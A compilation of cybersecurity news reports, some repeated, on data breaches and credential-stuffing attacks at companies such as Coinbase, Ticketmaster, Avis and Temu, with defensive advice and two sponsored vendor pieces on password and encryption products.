The password attacks of 2023: Lessons learned and next steps,https://www.bleepingcomputer.com/news/security/the-password-attacks-of-2023-lessons-learned-and-next-steps/#comment_form,Home,"December 20, 2023","It should take more than eight characters to bring a business to a halt. However, the relentless onslaught of password-based cyber attacks underscores the alarming ease with which cybercriminals can exploit vulnerable credentials to inflict damage. Password attacks take many forms: from phishing schemes that dupe employees into handing over their login information, to underground markets where bad actors can sell or purchase stolen credentials. Either way, having a valid password allows bad actors to do everything from stealing data to taking over critical business systems. In fact, nearly half (49%) of incidents cited in Verizon's 2023 Data Breach Investigations Report involved compromised passwords. The password attacks of 2023 involved the following high-profile brands: Best known for its genetic testing and ancestry services, 23andMe disclosed that a hacker was offering to sell names, location, and other data that could cover half of its 14 million users. This incident was attributed to credential stuffing, where guessing login credentials or using credentials stolen from other sources are used to gain unauthorized access. It may be known as a provider of antivirus protection, but the vendor found its own security compromised following the discovery of a credential stuffing attack. The incident involved the company's own Norton Lifelock Password Manager. Norton said the incident involved close to a million customers, of whom 6,500 had data compromised . In late August, the online charity that helps divert reusable goods from landfills sent out an urgent request asking members to change their passwords . In an online form, a hacker claimed the breach included up to seven million accounts, with details such as user IDs, e-mails and hashed passwords. The organization said the attack may have begun years ago when a server was exposed, adding that changing credentials was particularly important if members are using the same ones for other services. While the exact steps of a security incident response will vary somewhat depending on the extent of a breach, some of the best practices to minimize the damage include: 1. Issuing a 'Reset All Passwords' directive Blocking access to cybercriminals will prevent further repercussions from the initial breach. This means sending clear communication to all employees and customers to immediately change their passwords . Businesses can simplify this process for their employees through a self-service password reset tool to minimize calls to the helpdesk. 2. Having an incident response team If you haven't already walked through the steps to handling a cybersecurity incident, you'll need to bring the appropriate stakeholders together to develop an action plan. This usually includes the IT department, legal counsel, and even marketing communications teams who'll inform affected parties. You may also need to bring on third-party help to conduct digital forensics to understand the full scope of the attack's impact. 3. Notifying those whose personal information has been compromised Effective data breach disclosure needs to be comprehensive and clear, with next-best steps included. Make sure you've compiled answers to the most anticipated questions and provide simple mechanisms where people can contact you for more details. Advise on any recommendations to safeguard information, such as the password reset directive described above. Defending your business against password attacks isn't a matter of reinventing the wheel. Many businesses simply need to apply some of the standard protective measures. This starts with education. Employees should be regularly trained in password security and informed about the dangers of using the same passwords across multiple services. Given that cybercriminals may be buying or selling lists of previously compromised credentials, businesses should also build routine monitoring to ensure they're not at risk. Tools like Specops Password Policy , which continuously scans your Active Directory for compromised passwords, allows businesses to move from reactive to proactive password security. Passwords provide a key to some of the most valuable information and systems in the world. With the right technologies and procedures, businesses can improve their ability to ensure those keys don't fall into the wrong hands. Sponsored and written by Specops Software .",0.5653413534164429

In data breach notifications filed with the Office of Maine's Attorney General, Coinbase said, ""a small number of individuals, performing services for Coinbase at our overseas retail support locations, improperly accessed customer information."" While the exposed data did not include the impacted people's passwords, seed phrases, private keys, or other information that could be used to access their funds or accounts, it did include a combination of personal identifiers such as name, date of birth, last four digits of social security numbers, masked bank account numbers and some bank account identifiers, addresses, phone number, and email address. Depending on the affected customer, the stolen information can also contain images of government identification information (e.g., driver's license number, passport number, national identity card number) and account information (including transaction history, balance, transfers, account opening date). ""Attackers seek out this information because they want to conduct social engineering attacks, using this information to appear credible to try and convince victims to move their funds,"" Coinbase warned. The disclosure comes after many have voiced their concern that this incident could lead to serious consequences, including physical harm, after cybercriminals gain access to the account balances and addresses of impacted Coinbase customers affected by this data breach. On Thursday, Coinbase disclosed the data breach in a filing with the U.S. Securities and Exchange Commission that the threat actors behind this attack obtained customer data of up to 1% of Coinbase's customer base with the help of support staff or contractors outside the United States. The attackers also sent an email on May 11 attempting to extort a $20 million ransom payment in exchange for not releasing the stolen information online. However, the crypto exchange said it would not pay the ransom but would establish a $20 million reward fund for tips that could help find the attackers who coordinated this attack and bring them to justice. While Coinbase is still assessing the breach's financial impact and the number of customers who were tricked into sending funds to the attackers in follow-up social engineering attacks is still unknown, the company said the resulting expenses will likely be ""within the range of approximately $180 million to $400 million"" for remediation and customer refunds. ""Coinbase will voluntarily reimburse retail customers who mistakenly sent funds to the scammer as a direct result of this incident prior to the date of this post, following a review to confirm the facts,"" the company said. Coinbase advises customers to be cautious of scammers impersonating their employees, who may try to obtain funds or sensitive information like passwords or 2FA codes.

As Ascension revealed in breach notification letters sent to affected individuals in April, their information was stolen in a data theft attack that impacted a former business partner in December. Depending on the impacted patient, the attackers could access personal health information related to inpatient visits, including the physician's name, admission and discharge dates, diagnosis and billing codes, medical record number, and insurance company name. They could also gain access to personal information, including name, address, phone number(s), email address, date of birth, race, gender, and Social Security numbers (SSNs). ""On December 5, 2024, we learned that Ascension patient information may have been involved in a potential security incident. We immediately initiated an investigation to determine whether and how a security incident occurred,"" Ascension said . ""Our investigation determined on January 21, 2025, that Ascension inadvertently disclosed information to a former business partner, and some of this information was likely stolen from them due to a vulnerability in third-party software used by the former business partner."" While Ascension didn't reveal the total number of affected individuals at the time, an April 29 filing said that the incident impacted 114,692 individuals in Texas, and the company also told Massachusetts' Office of the Attorney General that 96 residents had their medical records and SSNs exposed in the incident. However, the healthcare giant also disclosed in an April 28 filing with the U.S. Department of Health & Human Services (HHS) that wasn't published until today that the data breach affected 437,329 individuals. ​Ascension offers two years of free identity monitoring services to those impacted by this incident, including credit monitoring, fraud consultation, and identity theft restoration. Although Ascension didn't share any details regarding the breach affecting its former business partner, the timeline of the breach implies that the attack was part of widespread Clop ransomware data theft attacks that exploited a zero-day flaw in Cleo secure file transfer software. Last year, Ascension notified almost 5.6 million patients and employees that their personal, financial, insurance, and health information had been stolen in a May 2024 Black Basta ransomware attack . After the incident, the healthcare organization revealed that the ransomware breach resulted from an employee downloading a malicious file onto a company device. Following the May 2024 attack, employees were forced to keep track of procedures and medications on paper, as patients' electronic records couldn't be accessed. Ascension also had to pause some non-emergent elective procedures, tests, and appointments and redirect emergency medical services to unaffected healthcare units to prevent triage delays.

Retail chain Hot Topic hit by new credential stuffing attacks,https://www.bleepingcomputer.com/news/security/retail-chain-hot-topic-hit-by-new-credential-stuffing-attacks/#comments,Sergiu Gatlan,"March 28, 2024","American retailer Hot Topic disclosed that two waves of credential stuffing attacks in November exposed affected customers' personal information and partial payment data. The Hot Topic fast-fashion chain has over 10,000 employees in more than 630 store locations across the U.S. and Canada, the company's headquarters, and two distribution centers. In credential stuffing attacks, cybercriminals use automated tools to trigger millions of login attempts using a list of username and password pairs. The technique is particularly effective when users reuse the same login information across multiple platforms. Breach notification letters sent to potentially impacted customers this week reveal that attackers targeted Hot Topic Rewards accounts in automated attacks using login information obtained from an unknown source. ""We determined that unauthorized parties launched automated attacks against our website and mobile application on November 18-19 and November 25, 2023, using valid account credentials (e.g., email addresses and passwords) obtained from an unknown third-party source,"" Hot Topic said. ""Based on our investigation to date, we are not able to determine which, if any, accounts were accessed by unauthorized third parties as opposed to legitimate customer logins during the relevant time periods."" Sensitive information that could've been exposed on compromised accounts includes affected customers' names, email addresses, order histories, phone numbers, months and days of birth, and mailing addresses. Hot Topic says that breached Rewards accounts would have only allowed the attackers to access partial payment data, specifically the last four digits of the card number. The retail chain worked with external cybersecurity experts after the November attacks to deploy bot protection software that should block such attacks in the future. Hot Topic will also require customers who receive the data breach notifications to set a new password to prevent other threat actors from hijacking their Hot Topic web or mobile accounts.

""Ticketmaster recently discovered that an unauthorized third party obtained information from a cloud database hosted by a third-party data services provider,"" reads a data breach notification shared with the Office of the Maine Attorney General. ""Based on our investigation, we determined that the unauthorized activity occurred between April 2, 2024, and May 18, 2024. On May 23, 2024, we determined that some of your personal information may have been affected by the incident. We have not seen any additional unauthorized activity in the cloud database since we began our investigation."" Ticketmaster says that the breach exposed customers' names, basic contact information, and ""<extra>"" information, which is different depending on the user. The company recommends customers ""remain vigilant"" against identity theft and fraud and has offered one year of free identity monitoring to track their credit history. While Ticketmaster lazily said the breach only impacted more than 1000 people ("">1000""), it actually impacted millions of customers worldwide and exposed what many would consider much more sensitive information. Last month, a threat actor known as ShinyHunters began selling stolen data from Live Nation/Ticketmaster, claiming it contained the personal information and credit card information of 560 million users. The threat actors used compromised Ticketmaster credentials that did not have multi-factor authentication enabled to steal the data from their Snowflake account. Snowflake is a cloud-based data warehousing company used by the enterprise to store databases, process data, and perform analytics. ShinyHunters began selling the data on May 28 on a well-known hacking forum for $500,000. The threat actor claimed that the data was 1.3TB and contained information for 560 million customers, ticket sales, event information, customer fraud, and partial credit card information. Samples of the data seen by BleepingComputer contained more than just ""basic contact information,"" including full names, email addresses, phone numbers, addresses, hashed credit card details, and payment amounts. After remaining silent for days, Ticketmaster eventually confirmed the breach on May 31, in a Friday evening SEC filing, stating that they did not believe the breach would have a material impact on their company. Ticketmaster's breach is one of many recent data theft attacks linked to the Snowflake database platform. A joint investigation by SnowFlake, Mandiant, and CrowdStrike revealed that a threat actor, tracked as UNC5537, used compromised customer credentials to target at least 165 organizations that had not configured multi-factor authentication protection on their accounts. To breach Snowflake accounts, the threat actor used credentials stolen by information-stealing malware infections dating back to 2020. Recent breaches linked to these attacks include Neiman Marcus , Santander , Ticketmaster , QuoteWizard/LendingTree , Advance Auto Parts , Los Angeles Unified , and Pure Storage .

A joint investigation by SnowFlake, Mandiant, and CrowdStrike revealed that a threat actor, tracked as UNC5537, used compromised customer credentials to target at least 165 organizations that had not configured multi-factor authentication protection on their accounts. To breach Snowflake accounts, the threat actor used credentials stolen by information-stealing malware infections dating back to 2020. Recent breaches linked to these attacks include Neiman Marcus , Santander , Ticketmaster , QuoteWizard/LendingTree , Advance Auto Parts , Los Angeles Unified , and Pure Storage .

Chanel says the breach was first detected on July 25th after threat actors gained access to a Chanel database hosted at a third-party service provider, as first reported by WWD . The breach only impacted customers in the United States and exposed personal contact information. ""Based on the findings of the investigation, the data obtained by the unauthorized external party contained limited details of a subset of individuals who contacted our client care center in the U.S. —specifically name, email address, mailing address and phone number,"" a Spokesperson told WWD. ""No other information was contained in the database. The clients affected have been informed."" While Chanel has not replied to our emails and the name of the third-party service provider was not mentioned, BleepingComputer has learned that it was stolen from the company's Salesforce instance. This attack has been attributed to the ongoing wave of Salesforce data-theft attacks conducted by the ShinyHunters extortion group. As first reported by Mandiant, threat actors have been actively targeting Salesforce customers in vishing (voice phishing) attacks to compromise credentials or to trick employees into authorizing a malicious OAuth app with their organization's Salesforce portal. Once they gain access to the Salesforce instance, they exfiltrate the database and use it as leverage in extortion demands on customers. In a statement to BleepingComputer, Salesforce emphasized that its platform was not compromised, but rather, customers' accounts are being breached in social engineering attacks. ""Salesforce has not been compromised, and the issues described are not due to any known vulnerability in our platform. While Salesforce builds enterprise-grade security into everything we do, customers also play a critical role in keeping their data safe — especially amid a rise in sophisticated phishing and social engineering attacks,"" Salesforce told BleepingComputer.

""On October 25, 2025, our team identified a cybersecurity incident that involved an unauthorized third party gaining access to and taking certain user contact information, which varied by individual,"" states the email notification from DoorDash. The information may have included: ""Our investigation has since confirmed that your personal information was affected."" The incident has been traced to a DoorDash employee falling victim to a social engineering scam. Upon becoming aware, the company's incident response team shut down the unauthorized party's access, started an investigation, and referred the matter to law enforcement. The disclosure does not specify how many users were affected, though the company says the incident impacted a mix of consumers, Dashers, and merchants. This marks the third notable security incident suffered by the delivery giant. In 2019, a data breach at DoorDash had exposed the information of roughly 5 million customers , Dashers and merchants to an unauthorized party. In August 2022, the company encountered another data breach from threat actors who had also attacked Twilio that year. What's interesting is that a French translation of the notice is appended to these emails: At this time, it appears that the emails primarily went to DoorDash Canada users (including myself). However, an undated security advisory posted on DoorDash's website suggests the incident may extend beyond Canada.

American car rental giant Avis notified customers that unknown attackers breached one of its business applications last month and stole some of their personal information. According to data breach notification letters sent to impacted customers on Wednesday and filed with California's Office of the Attorney General, the company took action to stop the unauthorized access, launched an investigation with the help of external cybersecurity experts, and reported the incident to relevant authorities after learning of the breach on August 5. This investigation revealed that the attacker accessed its business applications from August 3 until August 6, when the company evicted the malicious actor from its systems and blocked its access. On August 14, it also found that the attacker stole some customers' personal information, including their names and other undisclosed sensitive data. As revealed in a separate filing with Maine's attorney general , the attackers stole the personal information of 299,006 Avis customers in the breach. ""We continue to further enhance our cybersecurity practices and defenses and are sending individual notifications to approximately 300,000 U.S. customers (less than 1% of our customer base) whose personal information was affected with offers of complimentary credit and identity monitoring services,"" an Avis spokesperson told BleepingComputer. Since the breach, Avis says it has worked with outside experts to strengthen security measures for the affected application and implemented additional safeguards across its systems. The company added that it's actively reviewing security monitoring and controls to bolster security defenses and warned customers of identity theft and fraud risks following the data breach. ""It is always a good idea to remain vigilant against threats of identity theft or fraud,"" Avis told those whose personal information was stolen in the incident. ""You can do this by regularly reviewing and monitoring your account statements and credit history for any signs of unauthorized transactions or activity. You can contact the credit reporting agencies if you suspect any unauthorized activity."" The car rental company also offered those affected a free one-year membership to Equifax's credit monitoring service, which assists with identity theft detection and resolution. Avis is a subsidiary of Avis Budget Group, a leading global mobility solutions provider that also owns Zipcar, the world's leading car-sharing network. Its Avis and Budget car rental brands operate over 10,000 rental locations in 180 countries across North America, Europe, and Australasia.

American car rental giant Avis notified customers that unknown attackers breached one of its business applications last month and stole some of their personal information. According to data breach notification letters sent to impacted customers on Wednesday and filed with California's Office of the Attorney General, the company took action to stop the unauthorized access, launched an investigation with the help of external cybersecurity experts, and reported the incident to relevant authorities after learning of the breach on August 5. This investigation revealed that the attacker accessed its business applications from August 3 until August 6, when the company evicted the malicious actor from its systems and blocked its access. On August 14, it also found that the attacker stole some customers' personal information, including their names and other undisclosed sensitive data. As revealed in a separate filing with Maine's attorney general , the attackers stole the personal information of 299,006 Avis customers in the breach. ""We continue to further enhance our cybersecurity practices and defenses and are sending individual notifications to approximately 300,000 U.S. customers (less than 1% of our customer base) whose personal information was affected with offers of complimentary credit and identity monitoring services,"" an Avis spokesperson told BleepingComputer. Since the breach, Avis says it has worked with outside experts to strengthen security measures for the affected application and implemented additional safeguards across its systems. The company added that it's actively reviewing security monitoring and controls to bolster security defenses and warned customers of identity theft and fraud risks following the data breach. ""It is always a good idea to remain vigilant against threats of identity theft or fraud,"" Avis told those whose personal information was stolen in the incident. ""You can do this by regularly reviewing and monitoring your account statements and credit history for any signs of unauthorized transactions or activity. You can contact the credit reporting agencies if you suspect any unauthorized activity."" The car rental company also offered those affected a free one-year membership to Equifax's credit monitoring service, which assists with identity theft detection and resolution. Avis is a subsidiary of Avis Budget Group, a leading global mobility solutions provider that also owns Zipcar, the world's leading car-sharing network. Its Avis and Budget car rental brands operate over 10,000 rental locations in 180 countries across North America, Europe, and Australasia. Avis Budget Group has reported more than $3.0 billion in revenues for the second quarter of 2024. The company has not responded to multiple requests for comment from BleepingComputer asking for more information about the attack's nature, the number of affected customers, and the other personal information stolen in the breach.

However, it appears to just be a compilation of previously leaked credentials stolen by infostealers, exposed in data breaches, and via credential stuffing attacks. To be clear, this is not a new data breach, or a breach at all, and the websites involved were not recently compromised to steal these credentials. Instead, these stolen credentials were likely circulating for some time, if not for years. It was then collected by a cybersecurity firm, researchers, or threat actors and repackaged into a database that was exposed on the Internet. Cybernews, which discovered the briefly exposed datasets of compiled credentials, stated it was stored in a format commonly associated with infostealer malware, though they did not share samples An infostealer is malware that attempts to steal credentials, cryptocurrency wallets, and other data from an infected device. Over the years, infostealers have become a massive problem, leading to breaches worldwide. These types of malware impact both Windows and Macs, and when executed, will gather all the credentials it can find stored on a device and save them in what is called a ""log."" An infostealer log is generally an archive containing numerous text files and other stolen data. The text files contain lists of credentials stolen from browsers, files, and other applications. Stolen credentials are usually saved one per line in the following format: Sometimes, the delimiter between each component is changed to a comma, semicolon, or dash. For example, the following is how an infostealer will save credentials stolen from a device to a log: If someone is infected with an infostealer and has a thousand credentials saved in their browser, the infostealer will steal them all and store them in the log. These logs are then uploaded to the threat actor, where the credentials can be used for further attacks or sold on cybercrime marketplaces. The infostealer problem has gotten so bad and pervasive that compromised credentials have become one of the most common ways for threat actors to breach networks. We have a webinar next month titled "" Stolen credentials: The New Front Door to Your Network "" that focuses on infostealers, compromised credentials, and how organizations can protect themselves. This problem has also led law enforcement worldwide to actively crack down on these cybercrime operations in recent actions, such as "" Operation Secure "" and the disruption of LummaStealer . As infostealers have become so abundant and commonly used, threat actors release massive compilations for free on Telegram, Pastebin, and Discord to gain reputation among the cybercrime community or as teasers to paid offerings. To see how many passwords are given away for free, the single 1,261.4 MB file in the image above contained over 64,000 credential pairs. There are thousands, if not hundreds of thousands, of similarly leaked archives being shared online, resulting in billions of credentials records released for free. Many of these free archives were likely compiled into massive data sets that were briefly exposed and seen by Cybernews. Similar credential collections were released in the past, such as the RockYou2024 leak , with over 9 billion records, and "" Colection #1 ,"" which contained over 22 million unique passwords. Despite the buzz, there's no evidence this compilation contains new or previously unseen data So, now that you know there was a massive leak of credentials likely stolen through infostealers, data breaches, and credential-stuffing attacks, you may be wondering what you should do. The most important step is to adopt and maintain good cybersecurity habits you should already be following. If you're concerned that an infostealer might be present on your computer, scan your device with a trusted antivirus program before changing any passwords. Otherwise, newly entered credentials could be stolen as well. Once you're confident your system is clean, focus on improving your password hygiene. That means using a unique, strong password for every site you use, and relying on a password manager to keep them organized and secure. However, even unique passwords won't help you stay protected if you are hacked, fall for a phishing attack, or install malware. Therefore, it is crucial that you also use two-factor authentication (2FA) along with an authentication app, like Microsoft Authenticator , Google Authenticator , or Authy , to manage your 2FA codes. Some password managers, like Bitwarden and 1Password, also include authentication functionality, allowing you to use one application for both. With 2FA enabled, even if a password at a site is compromised, threat actors cannot access the account without your 2FA code. As a general rule, you should avoid using SMS texts to receive 2FA codes, as threat actors can conduct SIM-swapping attacks to hijack your phone number and obtain them. As for this leak, with this many credentials leaked, there is a chance one of the readers of this article will be listed in the compilation. However, don't panic and stress about it, running around changing all your passwords. Instead, take this opportunity to improve your cybersecurity habits. To check if your credentials have appeared in known breaches, consider using services like Have I Been Pwned .

Temu denies breach after hacker claims theft of 87 million data records,https://www.bleepingcomputer.com/news/security/temu-denies-breach-after-hacker-claims-theft-of-87-million-data-records/#comment_form,Bill Toulas,"September 17, 2024","Temu denies it was hacked or suffered a data breach after a threat actor claimed to be selling a stolen database containing 87 million records of customer information. The threat actor put the alleged data up for sale yesterday on the BreachForums hacking forum, along with a small sample to serve as proof of the stolen data. Temu says it has examined and cross-checked the data samples with its database, but no matches were found. Temu is a rapidly growing e-commerce platform offering a wide range of products at competitive prices, focusing on low-cost clothing, home goods, electronics, and accessories. Temu is Chinese but operates globally, including in Europe and the United States, where it gained popularity for its deep discounts and promotional strategies. Though Temu has faced scrutiny over concerns relating to data privacy, product quality, and shipping times, it has not found itself at the epicenter of a major data breach incident as of yet. Yesterday, a threat actor using the moniker 'smokinthashit' claimed to have stolen a database with 87 million records from Temu and attempted to sell it to other cybercriminals. The threat actor published samples of the allegedly stolen data that contained usernames and IDs, IP addresses, full names, dates of birth, gender, shipping addresses, phone numbers, and hashed passwords. Responding to BleepingComputer's request for comment, Temu categorically denied the published data is theirs and said it would press charges against those spreading this misinformation. ""Temu's security team has conducted a comprehensive investigation into the alleged data breach and can confirm that the claims are categorically false; the data being circulated is not from our systems. Not a single line of data matches our transaction records,"" Temu told BleepingComputer. ""We take any attempt to tarnish our reputation or harm our users extremely seriously and reserve the right to pursue legal action against those responsible for spreading false information and attempting to profit from such malicious activities.""

Temu denies breach after hacker claims theft of 87 million data records,https://www.bleepingcomputer.com/news/security/temu-denies-breach-after-hacker-claims-theft-of-87-million-data-records/,Bill Toulas,"September 17, 2024","Temu denies it was hacked or suffered a data breach after a threat actor claimed to be selling a stolen database containing 87 million records of customer information. The threat actor put the alleged data up for sale yesterday on the BreachForums hacking forum, along with a small sample to serve as proof of the stolen data. Temu says it has examined and cross-checked the data samples with its database, but no matches were found. Temu is a rapidly growing e-commerce platform offering a wide range of products at competitive prices, focusing on low-cost clothing, home goods, electronics, and accessories. Temu is Chinese but operates globally, including in Europe and the United States, where it gained popularity for its deep discounts and promotional strategies. Though Temu has faced scrutiny over concerns relating to data privacy, product quality, and shipping times, it has not found itself at the epicenter of a major data breach incident as of yet. Yesterday, a threat actor using the moniker 'smokinthashit' claimed to have stolen a database with 87 million records from Temu and attempted to sell it to other cybercriminals. The threat actor published samples of the allegedly stolen data that contained usernames and IDs, IP addresses, full names, dates of birth, gender, shipping addresses, phone numbers, and hashed passwords. Responding to BleepingComputer's request for comment, Temu categorically denied the published data is theirs and said it would press charges against those spreading this misinformation. ""Temu's security team has conducted a comprehensive investigation into the alleged data breach and can confirm that the claims are categorically false; the data being circulated is not from our systems. Not a single line of data matches our transaction records,"" Temu told BleepingComputer.

France Travail is the French governmental agency responsible for registering unemployed individuals, providing financial aid, and assisting them in finding jobs. Yesterday, the agency disclosed that hackers stole details belonging to job seekers registered with the agency in the last 20 years in a cyberattack between February 6 and March 5. Data from individuals with a job candidate profile was also exposed. A notice on France’s portal for assisting victims of cyberattacks informs that affected individuals will receive a notification from the agency regarding the personal data violation as a result of the incident. France Travail has informed the country’s data protection agency, the National Commission of Informatique and Liberties (CNIL), which stated that up to 43 million people may be impacted. The types of the data that have been exposed from this attack include: This data increases the risk of identity theft and phishing for the exposed individuals, so the agency recommends potentially impacted people to be particularly vigilant with emails, phone calls, and SMS they receive. France Travail clarified that the data breach incident does not impact people’s bank details or account passwords, but CNIL warns that cybercriminals may use what’s available to correlate with missing data points from other breaches. Those impacted by the data breach incident at France Travail can file a complaint with the Paris prosecutor’s office to help with the investigation. Last August, France Travail suffered a massive data breach, which impacted approximately 10 million individuals . That incident was indirectly attributed to the Clop ransomware group breaching the agency's systems by exploiting a zero-day vulnerability in the MOVEit Transfer software tool.

FinWise data breach shows why encryption is your last defense,https://www.bleepingcomputer.com/news/security/finwise-data-breach-shows-why-encryption-is-your-last-defense/#comment_form,Home,"October 22, 2025","The 2024 FinWise data breach serves as a stark example of the growing insider threats faced by modern financial institutions. Unlike typical cyberattacks originating from external hackers, this incident stemmed from unauthorized access by a former employee using retained credentials. On May 31, 2024, the ex-employee accessed FinWise Bank’s systems after leaving the company and leaked sensitive personal information belonging to 689,000 customers of American First Finance (AFF). Even more alarming, this unauthorized access went undetected for more than a year before being discovered by the bank on June 18, 2025. The most troubling aspect of the case lies in the time gap between the initial breach and its discovery. FinWise Bank only became aware of the incident and notified affected customers in June 2025 which was over a year after the breach occurred. Lawsuits allege that the stolen data may not have been adequately encrypted and secured, causing public criticism and concern. Security experts emphasize that a well-designed information protection framework must not only encrypt critical financial data but also proactively detect and prevent abnormal access attempts. FinWise Bank’s failure to implement such basic safeguards, coupled with potentially poor encryption practices, has led the institution to face legal action and heightened scrutiny from regulators and customers alike. Although FinWise has yet to issue an official statement regarding its encryption practices, the data breach will result in irreversible damage to both the company and its customers. In incidents like the FinWise breach, encryption serves as the last line of defense for data. However, true data protection goes beyond encryption alone; it also requires key management and access control measures. If FinWise properly implemented and managed its data encryption systems, the exposure of customers’ personal information could have been prevented even after the breach. Moreover, effective key management could have lowered the risk of data misuse, safeguarding sensitive information from further exploitation. Prevent data misuse after cyber attacks. D.AMO combines encryption, key management, and centeralized control to protect your organization’s most sensitive data. In response to data breaches like the one at FinWise, Penta Security’s D.AMO (Encryption Platform) has drawn renewed attention as an effective countermeasure. More than just a data encryption tool, D.AMO is a comprehensive data security platform that integrates powerful encryption, granular access control, and an independent key management system (KMS). Launched in 2004 as South Korea’s first packaged encryption solution and a pioneering product among global leaders, D.AMO has since established itself as a trusted name in the industry. With over 10,000 clients across finance, public, and enterprise sectors, D.AMO’s long-standing experience and proven technology have solidified its position as a leading force in the database encryption market. D.AMO has established itself as the No. 1 data encryption solution in South Korea’s public sector, recognized for its robust cybersecurity infrastructure and specialized expertise. Trusted by government institutions and major enterprises alike, it leads the market with unmatched reliability and technological depth. The platform supports multiple encryption methods, including API-based, plug-in-based, and kernel-level encryption, ensuring flexible deployment across both new implementations and live service environments. Going further, D.AMO enables selective column-level encryption based on data sensitivity, minimizing performance degradation while maintaining full compatibility across all layers of a customer’s system environment. In high-traffic sectors such as finance and government, service continuity is critical. D.AMO ensures that search and operational functions remain intact even after encryption, allowing organizations to achieve both operational efficiency and strong data protection. This balance of performance and security has made us the preferred choice for countless public institutions and large-scale enterprises. While encryption itself can prevent the misuse of sensitive information in the event of a data breach, effective key management is equally critical. The strength of any data encryption strategy is directly proportional to the security of its key management system. D.AMO KMS is a dedicated hardware appliance designed to securely manage encryption keys independently from the data they protect. By separating the privileges of database administrators and security administrators, D.AMO KMS ensures that even those with access to encrypted data cannot access the corresponding keys. This separation of duties serves as one of the most effective defenses against insider threats, such as the FinWise data breach. Furthermore, because D.AMO KMS stores keys in a physically and logically isolated appliance, encrypted data remains protected even if a hacker or insider were to gain full access to the database. Without the decryption keys, the stolen data remains unusable—providing a powerful safeguard against both internal and external breaches. D.AMO Control Center enables centralized management and access control for all encryption products deployed across every layer of a customer’s internal server infrastructure. Through this unified management system, administrators can monitor logs generated by each product and efficiently operate encryption solutions within a single, integrated interface. Incidents like the FinWise data breach underscore the critical importance of user access privileges in preventing insider threats. D.AMO Control Center addresses this challenge by providing granular privilege management, including user account separation, encryption/decryption permission settings, and data access control. By enforcing strict role-based access policies, organizations can proactively defend against potential insider misuse and strengthen overall data security governance. The FinWise data breach was not merely a technical incident, but a systemic failure rooted in inadequate security governance and potentially insufficient encryption and centralized management.

FinWise data breach shows why encryption is your last defense,https://www.bleepingcomputer.com/news/security/finwise-data-breach-shows-why-encryption-is-your-last-defense/,Home,"October 22, 2025","The 2024 FinWise data breach serves as a stark example of the growing insider threats faced by modern financial institutions. Unlike typical cyberattacks originating from external hackers, this incident stemmed from unauthorized access by a former employee using retained credentials. On May 31, 2024, the ex-employee accessed FinWise Bank’s systems after leaving the company and leaked sensitive personal information belonging to 689,000 customers of American First Finance (AFF). Even more alarming, this unauthorized access went undetected for more than a year before being discovered by the bank on June 18, 2025. The most troubling aspect of the case lies in the time gap between the initial breach and its discovery. FinWise Bank only became aware of the incident and notified affected customers in June 2025 which was over a year after the breach occurred. Lawsuits allege that the stolen data may not have been adequately encrypted and secured, causing public criticism and concern. Security experts emphasize that a well-designed information protection framework must not only encrypt critical financial data but also proactively detect and prevent abnormal access attempts. FinWise Bank’s failure to implement such basic safeguards, coupled with potentially poor encryption practices, has led the institution to face legal action and heightened scrutiny from regulators and customers alike. Although FinWise has yet to issue an official statement regarding its encryption practices, the data breach will result in irreversible damage to both the company and its customers. In incidents like the FinWise breach, encryption serves as the last line of defense for data. However, true data protection goes beyond encryption alone; it also requires key management and access control measures. If FinWise properly implemented and managed its data encryption systems, the exposure of customers’ personal information could have been prevented even after the breach. Moreover, effective key management could have lowered the risk of data misuse, safeguarding sensitive information from further exploitation. Prevent data misuse after cyber attacks. D.AMO combines encryption, key management, and centeralized control to protect your organization’s most sensitive data. In response to data breaches like the one at FinWise, Penta Security’s D.AMO (Encryption Platform) has drawn renewed attention as an effective countermeasure. More than just a data encryption tool, D.AMO is a comprehensive data security platform that integrates powerful encryption, granular access control, and an independent key management system (KMS). Launched in 2004 as South Korea’s first packaged encryption solution and a pioneering product among global leaders, D.AMO has since established itself as a trusted name in the industry. With over 10,000 clients across finance, public, and enterprise sectors, D.AMO’s long-standing experience and proven technology have solidified its position as a leading force in the database encryption market. D.AMO has established itself as the No. 1 data encryption solution in South Korea’s public sector, recognized for its robust cybersecurity infrastructure and specialized expertise. Trusted by government institutions and major enterprises alike, it leads the market with unmatched reliability and technological depth. The platform supports multiple encryption methods, including API-based, plug-in-based, and kernel-level encryption, ensuring flexible deployment across both new implementations and live service environments. Going further, D.AMO enables selective column-level encryption based on data sensitivity, minimizing performance degradation while maintaining full compatibility across all layers of a customer’s system environment. In high-traffic sectors such as finance and government, service continuity is critical. D.AMO ensures that search and operational functions remain intact even after encryption, allowing organizations to achieve both operational efficiency and strong data protection. This balance of performance and security has made us the preferred choice for countless public institutions and large-scale enterprises. While encryption itself can prevent the misuse of sensitive information in the event of a data breach, effective key management is equally critical. The strength of any data encryption strategy is directly proportional to the security of its key management system. D.AMO KMS is a dedicated hardware appliance designed to securely manage encryption keys independently from the data they protect. By separating the privileges of database administrators and security administrators, D.AMO KMS ensures that even those with access to encrypted data cannot access the corresponding keys. This separation of duties serves as one of the most effective defenses against insider threats, such as the FinWise data breach. Furthermore, because D.AMO KMS stores keys in a physically and logically isolated appliance, encrypted data remains protected even if a hacker or insider were to gain full access to the database. Without the decryption keys, the stolen data remains unusable—providing a powerful safeguard against both internal and external breaches. D.AMO Control Center enables centralized management and access control for all encryption products deployed across every layer of a customer’s internal server infrastructure. Through this unified management system, administrators can monitor logs generated by each product and efficiently operate encryption solutions within a single, integrated interface. Incidents like the FinWise data breach underscore the critical importance of user access privileges in preventing insider threats. D.AMO Control Center addresses this challenge by providing granular privilege management, including user account separation, encryption/decryption permission settings, and data access control. By enforcing strict role-based access policies, organizations can proactively defend against potential insider misuse and strengthen overall data security governance. The FinWise data breach was not merely a technical incident, but a systemic failure rooted in inadequate security governance and potentially insufficient encryption and centralized management. This case highlights the growing need for financial institutions to adopt robust defense strategies—not only against external attacks, but also against unpredictable insider threats. Penta Security’s D.AMO provides a comprehensive solution to these challenges. Designed to meet global compliance standards such as PCI-DSS, GDPR, ITSCC, CCPA, and CPRA, D.AMO integrates data encryption (D.AMO), a dedicated key management system (D.AMO KMS), and centralized management (D.AMO Control Center) into a single, unified platform.

